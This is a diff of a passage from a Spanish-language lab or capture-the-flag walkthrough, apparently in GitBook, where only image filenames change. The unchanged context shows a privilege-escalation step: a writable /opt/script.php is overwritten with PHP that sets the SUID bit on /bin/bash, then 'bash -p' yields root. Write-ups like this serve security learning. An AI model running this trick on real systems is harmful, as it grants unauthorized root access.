@@ -94,7 +94,7 @@ Somos el usuario **chocolate** pero no tenemos permisos **SUDO**.
 
 Revisando los directorios encontramos un archivo llamado `script.php` por lo que miramos si se puede modificar para obtener una **shell**.
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 echo -e "<?php\n\tsystem('chmod u+s /bin/bash');\n?>" > /opt/script.php
@@ -103,4 +103,4 @@ bash -p
 
 Ya somos **root**.
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
